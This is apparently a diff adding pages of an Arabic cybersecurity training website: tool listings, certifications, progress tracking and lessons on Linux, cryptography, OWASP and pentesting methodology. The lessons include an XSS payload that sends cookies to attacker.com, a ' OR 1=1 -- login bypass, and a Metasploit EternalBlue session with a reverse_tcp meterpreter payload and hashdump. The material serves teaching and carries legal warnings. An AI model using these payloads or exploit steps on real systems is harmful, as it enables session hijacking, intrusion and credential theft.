+      <div class="tool-card"><div class="tool-icon">🧬</div><div class="tool-name">Ghidra / IDA Pro</div><div class="tool-desc">// أدوات الهندسة العكسية لتحليل البرمجيات الخبيثة وفهم الكود الثنائي</div><span class="tool-cat cat-forensic">REVERSE</span></div>
+      <div class="tool-card"><div class="tool-icon">🌐</div><div class="tool-name">Shodan</div><div class="tool-desc">// محرك بحث الأجهزة المتصلة بالإنترنت. يكتشف الأجهزة المكشوفة والثغرات</div><span class="tool-cat cat-recon">OSINT</span></div>
+      <div class="tool-card"><div class="tool-icon">⚡</div><div class="tool-name">Aircrack-ng</div><div class="tool-desc">// مجموعة أدوات أمن شبكات WiFi. فحص WEP/WPA/WPA2 والمصادقة</div><span class="tool-cat cat-network">WIRELESS</span></div>
+      <div class="tool-card"><div class="tool-icon">🤖</div><div class="tool-name">SQLmap</div><div class="tool-desc">// أداة اكتشاف ثغرات SQL Injection التلقائية. تدعم جميع قواعد البيانات</div><span class="tool-cat cat-exploit">WEB</span></div>
+      <div class="tool-card"><div class="tool-icon">🕸️</div><div class="tool-name">Nikto</div><div class="tool-desc">// ماسح ثغرات خوادم الويب. يكتشف الملفات الخطيرة والإعدادات الخاطئة</div><span class="tool-cat cat-exploit">WEB</span></div>
+    </div>
+    <div style="margin-top:30px">
+      <div class="sec-hd"><div class="sec-title">// أوامر <span class="hl">أساسية</span></div><div class="sec-hd-line"></div></div>
+      <div class="sec-sub" style="margin-bottom:16px">// الأوامر التي لا غنى عنها يومياً</div>
+      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px">
+        <div class="tool-card">
+          <div style="color:var(--green);font-family:var(--font-mono);font-size:.78rem;margin-bottom:12px;letter-spacing:2px">// NMAP_COMMANDS</div>
+          <div class="term-block">
+            <div class="term-code" style="padding:12px 14px;font-size:.78rem">
+<span class="cmd">nmap</span> <span class="flag">-sV -sC</span> 192.168.1.1  <span class="comment"># فحص الخدمات</span>
+<span class="cmd">nmap</span> <span class="flag">-p-</span> 192.168.1.1       <span class="comment"># كل المنافذ</span>
+<span class="cmd">nmap</span> <span class="flag">-O</span> 192.168.1.1        <span class="comment"># كشف OS</span>
+<span class="cmd">nmap</span> <span class="flag">-A</span> 192.168.1.1        <span class="comment"># فحص شامل</span>
+<span class="cmd">nmap</span> <span class="flag">--script vuln</span> TARGET <span class="comment"># فحص ثغرات</span>
+            </div>
+          </div>
+        </div>
+        <div class="tool-card">
+          <div style="color:var(--green);font-family:var(--font-mono);font-size:.78rem;margin-bottom:12px;letter-spacing:2px">// LINUX_SECURITY</div>
+          <div class="term-block">
+            <div class="term-code" style="padding:12px 14px;font-size:.78rem">
+<span class="cmd">netstat</span> <span class="flag">-tulpn</span>              <span class="comment"># المنافذ المفتوحة</span>
+<span class="cmd">ps</span> <span class="flag">aux</span> | grep suspicious  <span class="comment"># العمليات</span>
+<span class="cmd">find</span> / <span class="flag">-perm -4000</span> 2>/dev/null <span class="comment"># SUID</span>
+<span class="cmd">last</span> <span class="flag">-a</span>                   <span class="comment"># آخر تسجيلات</span>
+<span class="cmd">cat</span> /var/log/auth.log      <span class="comment"># سجل المصادقة</span>
+            </div>
+          </div>
+        </div>
+        <div class="tool-card">
+          <div style="color:var(--red);font-family:var(--font-mono);font-size:.78rem;margin-bottom:12px;letter-spacing:2px">// METASPLOIT_BASICS</div>
+          <div class="term-block">
+            <div class="term-code" style="padding:12px 14px;font-size:.78rem">
+<span class="danger">msfconsole</span>               <span class="comment"># تشغيل Metasploit</span>
+<span class="danger">search</span> ms17-010          <span class="comment"># بحث عن exploit</span>
+<span class="danger">use</span> exploit/name          <span class="comment"># استخدام exploit</span>
+<span class="danger">set</span> RHOSTS 192.168.1.1   <span class="comment"># تحديد الهدف</span>
+<span class="danger">run</span>                       <span class="comment"># تنفيذ الهجوم</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== CERTS ========== -->
+  <div class="pg" id="pg-certs">
+    <div class="sec-hd"><div class="sec-title">🏆 الشهادات <span class="hl">الاحترافية</span></div><div class="sec-hd-line"></div></div>
+    <div class="sec-sub">// الشهادات المعترف بها عالمياً في مجال الأمن السيبراني</div>
+    <div class="certs-grid">
+      <div class="cert-card cert-c2"><div class="cert-icon">➕</div><div class="cert-name">CompTIA Security+</div><div class="cert-org">// CompTIA — Entry Level</div><div class="cert-desc">الشهادة المثالية للبداية. تغطي مفاهيم الأمن الأساسية، التشفير، التهديدات، إدارة المخاطر. معترف بها من وزارة الدفاع الأمريكية</div><div class="cert-badges"><span class="cert-badge">🎯 مبتدئ</span><span class="cert-badge">⏱️ 3 أشهر</span><span class="cert-badge">💰 ~$392</span></div></div>
+      <div class="cert-card cert-c1"><div class="cert-icon">💀</div><div class="cert-name">CEH</div><div class="cert-org">// EC-Council — Certified Ethical Hacker</div><div class="cert-desc">الشهادة الأشهر في اختبار الاختراق الأخلاقي. تغطي منهجيات الهاكر الأخلاقي ومراحل الاختراق الخمس</div><div class="cert-badges"><span class="cert-badge">🎯 متوسط</span><span class="cert-badge">⏱️ 4-6 أشهر</span><span class="cert-badge">💰 ~$950</span></div></div>
+      <div class="cert-card cert-c1"><div class="cert-icon">🔴</div><div class="cert-name">OSCP</div><div class="cert-org">// Offensive Security — PWK Course</div><div class="cert-desc">أصعب وأقيم شهادة في اختبار الاختراق العملي. الاختبار 24 ساعة متواصلة اختراق حقيقي. معيار الصناعة</div><div class="cert-badges"><span class="cert-badge">🎯 متقدم</span><span class="cert-badge">⏱️ 6-12 شهر</span><span class="cert-badge">💰 ~$1499</span></div></div>
+      <div class="cert-card cert-c3"><div class="cert-icon">🛡️</div><div class="cert-name">CISSP</div><div class="cert-org">// (ISC)² — Information Systems Security</div><div class="cert-desc">الشهادة الأرقى في مجال أمن المعلومات للمديرين والخبراء. تغطي 8 مجالات CISSP CBK الشاملة</div><div class="cert-badges"><span class="cert-badge">🎯 خبير</span><span class="cert-badge">⏱️ 12-18 شهر</span><span class="cert-badge">💰 ~$749</span></div></div>
+      <div class="cert-card cert-c4"><div class="cert-icon">🔬</div><div class="cert-name">CHFI</div><div class="cert-org">// EC-Council — Computer Hacking Forensic</div><div class="cert-desc">شهادة التحليل الجنائي الرقمي. تحقيقات الجرائم الإلكترونية، تحليل الأدلة الرقمية، استرداد البيانات</div><div class="cert-badges"><span class="cert-badge">🎯 متقدم</span><span class="cert-badge">⏱️ 4-6 أشهر</span><span class="cert-badge">💰 ~$950</span></div></div>
+      <div class="cert-card cert-c2"><div class="cert-icon">🔵</div><div class="cert-name">eJPT</div><div class="cert-org">// eLearnSecurity Junior Penetration Tester</div><div class="cert-desc">الشهادة المثالية للمبتدئين في اختبار الاختراق. عملية 100% ورخيصة نسبياً. بداية قوية</div><div class="cert-badges"><span class="cert-badge">🎯 مبتدئ</span><span class="cert-badge">⏱️ 2-3 أشهر</span><span class="cert-badge">💰 ~$200</span></div></div>
+      <div class="cert-card cert-c5"><div class="cert-icon">☁️</div><div class="cert-name">AWS Security Specialty</div><div class="cert-org">// Amazon Web Services</div><div class="cert-desc">أمن البنية السحابية على AWS. IAM، KMS، GuardDuty، Security Hub. مطلوب جداً في سوق العمل</div><div class="cert-badges"><span class="cert-badge">🎯 متقدم</span><span class="cert-badge">⏱️ 4-6 أشهر</span><span class="cert-badge">💰 ~$300</span></div></div>
+      <div class="cert-card cert-c3"><div class="cert-icon">🔐</div><div class="cert-name">CISM</div><div class="cert-org">// ISACA — Certified Information Security Manager</div><div class="cert-desc">شهادة إدارة أمن المعلومات للمديرين. استراتيجية الأمن، إدارة المخاطر، حوكمة الأمن المؤسسي</div><div class="cert-badges"><span class="cert-badge">🎯 مدير</span><span class="cert-badge">⏱️ 6-12 شهر</span><span class="cert-badge">💰 ~$760</span></div></div>
+      <div class="cert-card cert-c1"><div class="cert-icon">⚡</div><div class="cert-name">CRTO</div><div class="cert-org">// Zero-Point Security — Red Team Operator</div><div class="cert-desc">شهادة Red Team Operations الحديثة. Cobalt Strike، Active Directory Attacks، Evasion Techniques</div><div class="cert-badges"><span class="cert-badge">🎯 خبير</span><span class="cert-badge">⏱️ 3-6 أشهر</span><span class="cert-badge">💰 ~$499</span></div></div>
+    </div>
+  </div>
+
+  <!-- ========== PROGRESS ========== -->
+  <div class="pg" id="pg-progress">
+    <div class="sec-hd"><div class="sec-title">📊 <span class="hl">تقدمك</span> التعليمي</div><div class="sec-hd-line"></div></div>
+    <div class="sec-sub">// تتبع رحلتك الأمنية واحتفل بإنجازاتك</div>
+    <div class="prog-overview">
+      <div class="prog-box"><div class="prog-big g" id="pp-less">0</div><div class="prog-lbl">LESSONS_DONE</div></div>
+      <div class="prog-box"><div class="prog-big c" id="pp-labs">0</div><div class="prog-lbl">LABS_COMPLETED</div></div>
+      <div class="prog-box"><div class="prog-big o" id="pp-xp">0</div><div class="prog-lbl">XP_EARNED</div></div>
+      <div class="prog-box"><div class="prog-big r" id="pp-quiz">0</div><div class="prog-lbl">QUIZZES_PASSED</div></div>
+    </div>
+    <div class="xp-section">
+      <div class="xp-row">
+        <span class="xp-title">RANK: <span id="rank-name" style="color:var(--green)">SCRIPT_KIDDIE</span></span>
+        <span class="xp-val" id="xp-counter">0 / 500 XP</span>
+      </div>
+      <div class="xp-track"><div class="xp-fill" id="xp-fill" style="width:0%"></div></div>
+    </div>
+    <div class="lvl-pg-bars" id="lvl-prog-bars">
+      <div class="lvl-pg-row">
+        <div class="lvl-pg-row-hd"><span>LVL-01 // الأساسيات</span><span style="color:var(--green)" id="pp1">0%</span></div>
+        <div class="mini-bar"><div class="mini-bar-fill" id="pb1" style="width:0%;background:var(--green)"></div></div>
+      </div>
+      <div class="lvl-pg-row">
+        <div class="lvl-pg-row-hd"><span>LVL-02 // الاختراق</span><span style="color:var(--cyan)" id="pp2">0%</span></div>
+        <div class="mini-bar"><div class="mini-bar-fill" id="pb2" style="width:0%;background:var(--cyan)"></div></div>
+      </div>
+      <div class="lvl-pg-row">
+        <div class="lvl-pg-row-hd"><span>LVL-03 // الدفاع</span><span style="color:var(--orange)" id="pp3">0%</span></div>
+        <div class="mini-bar"><div class="mini-bar-fill" id="pb3" style="width:0%;background:var(--orange)"></div></div>
+      </div>
+      <div class="lvl-pg-row">
+        <div class="lvl-pg-row-hd"><span>LVL-04 // الاحتراف</span><span style="color:var(--red)" id="pp4">0%</span></div>
+        <div class="mini-bar"><div class="mini-bar-fill" id="pb4" style="width:0%;background:var(--red)"></div></div>
+      </div>
+    </div>
+    <div class="sec-hd" style="margin-bottom:14px"><div class="sec-title" style="font-size:1rem">// <span class="hl">ACHIEVEMENTS</span></div><div class="sec-hd-line"></div></div>
+    <div class="achv-grid" id="achv-grid"></div>
+  </div>
+
+</div><!-- /app -->
+
+<script>
+// =====================================================
+// DATA: LESSONS
+// =====================================================
+const LESSONS = {
+  1: [
+    {
+      id:'1-1', title:'مقدمة الأمن السيبراني', desc:'ما هو الأمن السيبراني؟ لماذا مهم؟ مجالاته وفرص العمل',
+      topics:['تعريف الأمن السيبراني','مجالات الأمن','Red Team vs Blue Team','فرص العمل والرواتب'],
+      fact:'سوق الأمن السيبراني العالمي يُقدَّر بـ 266 مليار دولار بحلول 2027 — ونقص حاد بـ 3.5 مليون وظيفة!',
+      content:`
+        <h3>ما هو الأمن السيبراني؟</h3>
+        <p>الأمن السيبراني هو مجموعة التقنيات والعمليات والممارسات المصممة لحماية الأنظمة والشبكات والبيانات من الهجمات الرقمية والاختراق والتلف.</p>
+        <div class="info-box"><p>// يشمل حماية: الأجهزة (Hardware) — البرمجيات (Software) — البيانات (Data) — الشبكات (Networks) — الأشخاص (People)</p></div>
+        <h3>المجالات الرئيسية</h3>
+        <p><strong>🔴 Red Team (الهجوم):</strong> Penetration Testing، Exploit Development، Social Engineering — يفكر كالمهاجم لاكتشاف الثغرات قبل الأعداء.</p>
+        <p><strong>🔵 Blue Team (الدفاع):</strong> SOC Analysis، Incident Response، Threat Hunting — يراقب ويدافع ويستجيب للهجمات.</p>
+        <p><strong>🟣 Purple Team:</strong> يدمج قدرات الفريقين لتحسين الأمان الكلي للمؤسسة.</p>
+        <h3>فرص العمل</h3>
+        <table class="data-table">
+          <tr><th>المسمى الوظيفي</th><th>المجال</th><th>متوسط الراتب (سنوي)</th></tr>
+          <tr><td>Penetration Tester</td><td>Red Team</td><td>$90,000 - $140,000</td></tr>
+          <tr><td>SOC Analyst</td><td>Blue Team</td><td>$60,000 - $100,000</td></tr>
+          <tr><td>Malware Analyst</td><td>Forensics</td><td>$80,000 - $130,000</td></tr>
+          <tr><td>CISO</td><td>Management</td><td>$180,000+</td></tr>
+        </table>
+        <div class="warn-box"><p>⚠️ تذكير مهم: الأمن السيبراني الأخلاقي يعني اختبار الأنظمة فقط بإذن صريح وكتابي. أي اختراق بدون إذن يُعدّ جريمة يُعاقب عليها القانون.</p></div>
+      `
+    },
+    {
+      id:'1-2', title:'Linux للأمن السيبراني', desc:'إتقان سطر الأوامر والأوامر الأساسية في Kali Linux',
+      topics:['لماذا Linux؟','أوامر الملفات والمجلدات','صلاحيات Linux','البحث والفلترة','العمليات والشبكة'],
+      fact:'90% من أدوات الأمن السيبراني تعمل على Linux فقط أو بشكل أفضل عليه — Kali يأتي بـ 600+ أداة أمنية!',
+      content:`
+        <h3>لماذا Linux ضروري؟</h3>
+        <p>Linux هو نظام التشغيل الأساسي في عالم الأمن السيبراني. معظم الخوادم تعمل عليه، ومعظم أدوات الاختراق مبنية له. Kali Linux هي التوزيعة المتخصصة للأمن السيبراني.</p>
+        <h3>الأوامر الأساسية</h3>
+        <div class="term-block">
+          <div class="term-titlebar"><div class="t-dot r"></div><div class="t-dot y"></div><div class="t-dot g"></div><span style="margin-right:8px">terminal@kali:~</span></div>
+          <div class="term-code">
+<span class="cmd">ls</span> <span class="flag">-la</span>              <span class="comment"># عرض الملفات بالتفاصيل والمخفية</span>
+<span class="cmd">cd</span> /etc/           <span class="comment"># الانتقال لمجلد</span>
+<span class="cmd">cat</span> /etc/passwd    <span class="comment"># عرض محتوى ملف</span>
+<span class="cmd">grep</span> <span class="flag">-r</span> "root" .   <span class="comment"># البحث في الملفات</span>
+<span class="cmd">chmod</span> 755 file.sh  <span class="comment"># تغيير صلاحيات</span>
+<span class="cmd">sudo</span> su            <span class="comment"># الانتقال لـ root</span>
+<span class="cmd">ps</span> <span class="flag">aux</span>             <span class="comment"># عرض العمليات</span>
+<span class="cmd">netstat</span> <span class="flag">-tulpn</span>     <span class="comment"># المنافذ المفتوحة</span>
+          </div>
+        </div>
+        <h3>صلاحيات Linux</h3>
+        <p>نظام الصلاحيات يعمل بالشكل: rwxrwxrwx — r=قراءة، w=كتابة، x=تنفيذ. كل رمز يمثل 3 فئات: المالك (Owner)، المجموعة (Group)، الآخرون (Others).</p>
+        <div class="info-box"><p>// ملفات الـ SUID (chmod 4755) هي هدف المهاجمين لرفع الصلاحيات! ابحث عنها بـ: find / -perm -4000 2>/dev/null</p></div>
+        <h3>الشبكة في Linux</h3>
+        <div class="term-block">
+          <div class="term-code">
+<span class="cmd">ifconfig</span>          <span class="comment"># معلومات الشبكة</span>
+<span class="cmd">ip</span> <span class="flag">addr show</span>      <span class="comment"># البديل الحديث</span>
+<span class="cmd">ping</span> 8.8.8.8       <span class="comment"># اختبار الاتصال</span>
+<span class="cmd">nslookup</span> site.com  <span class="comment"># استعلام DNS</span>
+<span class="cmd">wget</span> http://url    <span class="comment"># تحميل ملف</span>
+<span class="cmd">curl</span> <span class="flag">-I</span> http://url  <span class="comment"># رؤوس HTTP</span>
+          </div>
+        </div>
+      `
+    },
+    {
+      id:'1-3', title:'التشفير وأساسياته', desc:'Symmetric، Asymmetric، Hashing، PKI — كل شيء عن التشفير',
+      topics:['ما هو التشفير؟','التشفير المتماثل','التشفير غير المتماثل','Hash Functions','PKI والشهادات'],
+      fact:'AES-256 المستخدم في تشفير البيانات — لكسره بالقوة الغاشمة ستحتاج 10^57 سنة حتى مع أقوى حاسوب كمومي!',
+      content:`
+        <h3>لماذا التشفير أساسي؟</h3>
+        <p>التشفير هو الركيزة الأساسية لأمن المعلومات. بدونه كل بياناتك على الإنترنت مكشوفة لأي شخص يستطيع الالتقاط.</p>
+        <h3>التشفير المتماثل (Symmetric)</h3>
+        <p>نفس المفتاح للتشفير وفك التشفير. سريع ومثالي للبيانات الكبيرة. المشكلة: كيف تنقل المفتاح بأمان؟</p>
+        <table class="data-table">
+          <tr><th>الخوارزمية</th><th>حجم المفتاح</th><th>الاستخدام</th></tr>
+          <tr><td>AES</td><td>128/192/256 bit</td><td>المعيار الحالي — الأقوى</td></tr>
+          <tr><td>DES</td><td>56 bit</td><td>قديم ومكسور — لا تستخدمه</td></tr>
+          <tr><td>3DES</td><td>112/168 bit</td><td>قديم — في طور الاستبدال</td></tr>
+        </table>
+        <h3>التشفير غير المتماثل (Asymmetric)</h3>
+        <p>مفتاحان: Public Key (عام للجميع) و Private Key (سري لك فقط). البيانات المشفرة بالعام تُفكّ فقط بالخاص. يحل مشكلة نقل المفاتيح.</p>
+        <div class="info-box"><p>// مثال: HTTPS يستخدم RSA/ECDH لتبادل مفاتيح AES بأمان. ثم AES يشفر البيانات الفعلية لأنه أسرع.</p></div>
+        <h3>Hash Functions</h3>
+        <p>دالة تحول البيانات إلى بصمة ثابتة الحجم. أحادية الاتجاه — لا يمكن العكس. تُستخدم للتحقق من سلامة البيانات وتخزين كلمات المرور.</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="cmd">echo</span> "hello" | <span class="cmd">md5sum</span>
+<span class="out">b1946ac92492d2347c6235b4d2611184</span>
+<span class="cmd">echo</span> "hello" | <span class="cmd">sha256sum</span>
+<span class="out">5891b5b522d5df086d0ff0b110fbd9d21bb4fc7163af34d08286a2e846f6be03</span>
+          </div>
+        </div>
+        <div class="warn-box"><p>⚠️ MD5 وSHA1 مكسوران ويُعدّان غير آمنَين! استخدم SHA-256 أو SHA-3 دائماً.</p></div>
+      `
+    },
+    {
+      id:'1-4', title:'أنواع الهجمات السيبرانية', desc:'فهم أنواع التهديدات والهجمات التي تواجهها المؤسسات',
+      topics:['Malware أنواعه','Social Engineering','Man-in-the-Middle','DoS وDDoS','Insider Threats'],
+      fact:'هجمة Ransomware على Colonial Pipeline 2021 أوقفت إمدادات الوقود لنصف الساحل الشرقي الأمريكي — الفدية كانت $4.4 مليون!',
+      content:`
+        <h3>البرمجيات الخبيثة (Malware)</h3>
+        <p><strong>Virus:</strong> يرفق نفسه ببرامج شرعية وينتشر عند تشغيلها.</p>
+        <p><strong>Worm:</strong> ينتشر تلقائياً عبر الشبكة بدون تدخل بشري.</p>
+        <p><strong>Trojan:</strong> يتنكر كبرنامج شرعي ويفتح باباً خلفياً للمهاجم.</p>
+        <p><strong>Ransomware:</strong> يشفر ملفاتك ويطلب فدية مالية لفك التشفير.</p>
+        <p><strong>Rootkit:</strong> يختبئ عميقاً في النظام ويمنح المهاجم تحكماً كاملاً.</p>
+        <p><strong>Spyware/Keylogger:</strong> يجمع بياناتك سراً ويرسلها للمهاجم.</p>
+        <h3>الهندسة الاجتماعية</h3>
+        <p>استغلال النفس البشرية بدل الثغرات التقنية. يُقال إن 85% من الاختراقات تبدأ منها.</p>
+        <table class="data-table">
+          <tr><th>النوع</th><th>الأسلوب</th></tr>
+          <tr><td>Phishing</td><td>إيميل مزيف يخدعك لإدخال بياناتك</td></tr>
+          <tr><td>Spear Phishing</td><td>هجوم موجّه لشخص محدد</td></tr>
+          <tr><td>Vishing</td><td>خداع عبر المكالمة الهاتفية</td></tr>
+          <tr><td>Baiting</td><td>إغراء بشيء مغري (USB مجاني مثلاً)</td></tr>
+          <tr><td>Pretexting</td><td>ادعاء هوية زائفة لاستخراج معلومات</td></tr>
+        </table>
+        <h3>هجمات DDoS</h3>
+        <p>Distributed Denial of Service: يرسل المهاجم آلاف الطلبات من أجهزة موزعة (Botnet) لإغراق الخادم. أنواعه: Volumetric، Protocol، Application Layer.</p>
+        <div class="info-box"><p>// أكبر هجمة DDoS في التاريخ كانت على Cloudflare 2022 بحجم 71 مليون طلب في الثانية!</p></div>
+      `
+    },
+    {
+      id:'1-5', title:'OWASP Top 10', desc:'أخطر 10 ثغرات في تطبيقات الويب يجب أن يعرفها كل مطور ومختبر',
+      topics:['Injection','Broken Auth','XSS','IDOR','Security Misconfiguration','الحماية منها'],
+      fact:'OWASP Top 10 هي المرجع الأول عالمياً لأمن تطبيقات الويب — 95% من شركات الفورتشن 500 تستخدمه!',
+      content:`
+        <h3>ما هو OWASP؟</h3>
+        <p>Open Web Application Security Project — منظمة غير ربحية تُنتج معايير وأدوات لأمن تطبيقات الويب. قائمة Top 10 تُحدَّث كل 4 سنوات.</p>
+        <h3>A01 — Injection</h3>
+        <p>حقن أوامر خبيثة في استعلامات قاعدة البيانات أو الأوامر. SQL Injection هو الأشهر.</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># استعلام عادي:</span>
+SELECT * FROM users WHERE username='admin' AND password='pass';
+<span class="comment"># هجوم SQL Injection:</span>
+<span class="danger">username = ' OR 1=1 --</span>
+SELECT * FROM users WHERE username=<span class="danger">'' OR 1=1 --</span>' AND password='...';
+<span class="comment"># النتيجة: تجاوز المصادقة الكاملة!</span>
+          </div>
+        </div>
+        <h3>A02 — Broken Authentication</h3>
+        <p>ضعف في نظام المصادقة: كلمات مرور ضعيفة، عدم وجود MFA، Session Tokens غير آمنة.</p>
+        <h3>A03 — XSS (Cross-Site Scripting)</h3>
+        <p>حقن JavaScript خبيث في صفحات الويب يُنفَّذ في متصفح الضحية. يسرق الـ Cookies ويسمح بالاستيلاء على الجلسة.</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># مثال XSS بسيط:</span>
+<span class="danger">&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</span>
+          </div>
+        </div>
+        <h3>A04 — IDOR (Insecure Direct Object Reference)</h3>
+        <p>الوصول المباشر لموارد المستخدمين الآخرين بتغيير رقم في الـ URL مثل: /user/123 → /user/124</p>
+        <div class="warn-box"><p>⚠️ هذه الثغرة مسؤولة عن معظم تسريبات البيانات — وفّرت لباحثين ملايين الدولارات في Bug Bounty!</p></div>
+      `
+    }
+  ],
+  2: [
+    {
+      id:'2-1', title:'منهجية اختبار الاختراق', desc:'Penetration Testing Framework — المراحل الخمس للاختراق الأخلاقي',
+      topics:['Reconnaissance','Scanning','Exploitation','Post-Exploitation','Reporting'],
+      fact:'مختبرو الاختراق يتقاضون من $50 للساعة للمبتدئين إلى $500+/ساعة للخبراء في السوق الأمريكي!',
+      content:`
+        <h3>ما هو اختبار الاختراق؟</h3>
+        <p>Penetration Testing: محاكاة هجوم حقيقي على نظام بإذن رسمي لاكتشاف نقاط الضعف قبل المهاجمين الحقيقيين.</p>
+        <div class="info-box"><p>// القاعدة الذهبية: لا تختبر أي نظام بدون إذن كتابي صريح. نموذج "Scope of Work" هو حمايتك القانونية.</p></div>
+        <h3>المرحلة 1: الاستطلاع (Reconnaissance)</h3>
+        <p>جمع أقصى معلومات ممكنة عن الهدف. Passive (بدون تلامس مباشر) وActive (تفاعل مع الهدف).</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># Passive Recon:</span>
+<span class="cmd">whois</span> target.com              <span class="comment"># معلومات السجل</span>
+<span class="cmd">nslookup</span> target.com           <span class="comment"># سجلات DNS</span>
+<span class="cmd">theHarvester</span> <span class="flag">-d</span> target.com  <span class="comment"># إيميلات وموظفين</span>
+<span class="comment"># Google Dorks:</span>
+site:target.com filetype:pdf
+intitle:"index of" site:target.com
+          </div>
+        </div>
+        <h3>المرحلة 2: الفحص (Scanning)</h3>
+        <p>فحص نشط للأهداف المكتشفة لإيجاد المنافذ والخدمات والإصدارات والثغرات.</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="cmd">nmap</span> <span class="flag">-sV -sC -A -T4</span> target.com
+<span class="out">PORT   STATE SERVICE  VERSION</span>
+<span class="out">22/tcp open  ssh      OpenSSH 7.4</span>
+<span class="out">80/tcp open  http     Apache httpd 2.4.6</span>
+<span class="out">443/tcp open ssl/http Apache httpd 2.4.6</span>
+          </div>
+        </div>
+        <h3>المرحلة 3: الاستغلال (Exploitation)</h3>
+        <p>استغلال الثغرات المكتشفة للحصول على وصول أولي. يستخدم Metasploit أو Exploits يدوية.</p>
+        <h3>المرحلة 4: ما بعد الاستغلال</h3>
+        <p>رفع الصلاحيات (Privilege Escalation)، الحركة الأفقية (Lateral Movement)، الثبات (Persistence)، جمع البيانات.</p>
+        <h3>المرحلة 5: التقرير</h3>
+        <p>توثيق كل ثغرة مكتشفة بـ: CVSS Score، خطوات التكرار، التأثير، والحل المقترح.</p>
+      `
+    },
+    {
+      id:'2-2', title:'Nmap — فحص الشبكات', desc:'إتقان أقوى أداة فحص شبكات في عالم الأمن السيبراني',
+      topics:['أنواع الفحص','اكتشاف OS','فحص الإصدارات','NSE Scripts','تجاوز الـ Firewall'],
+      fact:'Nmap ظهر في فيلم The Matrix Reloaded 2003 — وهو أول برنامج اختراق يظهر بشكل حقيقي في سينما هوليود!',
+      content:`
+        <h3>Nmap — Network Mapper</h3>
+        <p>الأداة الأساسية لكل مختبر اختراق. تفحص الشبكات وتكتشف الأجهزة والخدمات والأنظمة والثغرات.</p>
+        <h3>أنواع الفحص الأساسية</h3>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># فحص TCP SYN (الأسرع والأكثر شيوعاً — يحتاج root)</span>
+<span class="cmd">nmap</span> <span class="flag">-sS</span> 192.168.1.0/24
+
+<span class="comment"># فحص TCP Connect (بدون root)</span>
+<span class="cmd">nmap</span> <span class="flag">-sT</span> 192.168.1.1
+
+<span class="comment"># فحص UDP (بطيء لكن مهم)</span>
+<span class="cmd">nmap</span> <span class="flag">-sU</span> 192.168.1.1
+
+<span class="comment"># فحص Stealth بأعلام FIN</span>
+<span class="cmd">nmap</span> <span class="flag">-sF</span> 192.168.1.1
+          </div>
+        </div>
+        <h3>فحص الخدمات والإصدارات</h3>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># كشف الإصدارات</span>
+<span class="cmd">nmap</span> <span class="flag">-sV</span> 192.168.1.1
+
+<span class="comment"># كشف نظام التشغيل</span>
+<span class="cmd">nmap</span> <span class="flag">-O</span> 192.168.1.1
+
+<span class="comment"># فحص شامل موصى به</span>
+<span class="cmd">nmap</span> <span class="flag">-sV -sC -O -T4 -p-</span> 192.168.1.1
+
+<span class="hi">OUTPUT:</span>
+<span class="out">OS: Linux 3.10 - 4.11</span>
+<span class="out">80/tcp http Apache 2.4.29 (Ubuntu)</span>
+<span class="out">22/tcp ssh  OpenSSH 7.6p1 Ubuntu</span>
+          </div>
+        </div>
+        <h3>NSE Scripts — القوة الحقيقية</h3>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># فحص الثغرات</span>
+<span class="cmd">nmap</span> <span class="flag">--script vuln</span> target
+
+<span class="comment"># فحص ثغرة محددة</span>
+<span class="cmd">nmap</span> <span class="flag">--script ms17-010</span> target
+
+<span class="comment"># فحص HTTP</span>
+<span class="cmd">nmap</span> <span class="flag">--script http-enum,http-headers</span> target
+
+<span class="comment"># فحص FTP anonymous login</span>
+<span class="cmd">nmap</span> <span class="flag">--script ftp-anon</span> -p 21 target
+          </div>
+        </div>
+      `
+    },
+    {
+      id:'2-3', title:'Metasploit Framework', desc:'إطار اختبار الاختراق الأقوى — من الاستطلاع حتى ما بعد الاستغلال',
+      topics:['بنية Metasploit','البحث عن Exploits','Payloads','Meterpreter','Post Exploitation'],
+      fact:'Metasploit يحتوي على 2000+ exploit وهو مفتوح المصدر مع نسخة احترافية تستخدمها أكبر شركات الأمن عالمياً!',
+      content:`
+        <h3>بنية Metasploit</h3>
+        <p>Metasploit Framework هو إطار العمل الأقوى لاختبار الاختراق. يتكون من: Exploits، Payloads، Auxiliary، Encoders، Post Modules.</p>
+        <div class="term-block">
+          <div class="term-code">
+<span class="comment"># تشغيل Metasploit</span>
+<span class="danger">msfconsole</span>
+
+<span class="comment"># البحث عن exploit</span>
+<span class="danger">msf6 &gt;</span> <span class="cmd">search</span> type:exploit platform:windows ms17-010
+
+<span class="hi">Matching Modules</span>
+<span class="out">0  exploit/windows/smb/ms17_010_eternalblue  Excellent</span>
+
+<span class="comment"># استخدام الـ exploit</span>
+<span class="danger">msf6 &gt;</span> <span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+<span class="danger">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">show options</span>
+          </div>
+        </div>
+        <h3>إعداد الـ Exploit وتشغيله</h3>
+        <div class="term-block">
+          <div class="term-code">
+<span class="cmd">set</span> RHOSTS 192.168.1.100    <span class="comment"># عنوان IP الهدف</span>
+<span class="cmd">set</span> LHOST 192.168.1.50     <span class="comment"># عنوانك</span>
+<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="cmd">run</span>
+
+<span class="hi">[*] Meterpreter session 1 opened!</span>
+          </div>
+        </div>
+        <h3>Meterpreter — Shell المتقدم</h3>
+        <div class="term-block">
+          <div class="term-code">
+<span class="danger">meterpreter &gt;</span> <span class="cmd">sysinfo</span>        <span class="comment"># معلومات الجهاز</span>
+<span class="danger">meterpreter &gt;</span> <span class="cmd">getuid</span>         <span class="comment"># المستخدم الحالي</span>
+<span class="danger">meterpreter &gt;</span> <span class="cmd">getsystem</span>      <span class="comment"># محاولة رفع الصلاحيات</span>
+<span class="danger">meterpreter &gt;</span> <span class="cmd">hashdump</span>       <span class="comment"># استخراج كلمات المرور</span>
